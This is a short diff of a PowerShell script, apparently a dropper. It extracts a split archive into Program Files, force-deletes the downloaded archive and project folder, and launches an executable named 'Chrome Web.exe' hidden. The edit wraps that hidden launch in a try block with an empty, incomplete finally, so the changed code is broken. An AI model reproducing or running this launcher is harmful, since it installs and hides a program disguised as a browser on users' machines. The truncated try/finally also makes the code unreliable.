@@ -23,6 +23,13 @@ Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -Ta
 
 Remove-Item -Force -Recurse 'C:\Users\win64.zip', 'C:\Users\ProJ03-main'
 
-Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden
+try
+{
+    Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden
+}
+finally
+
+
+
 
 Exit 5
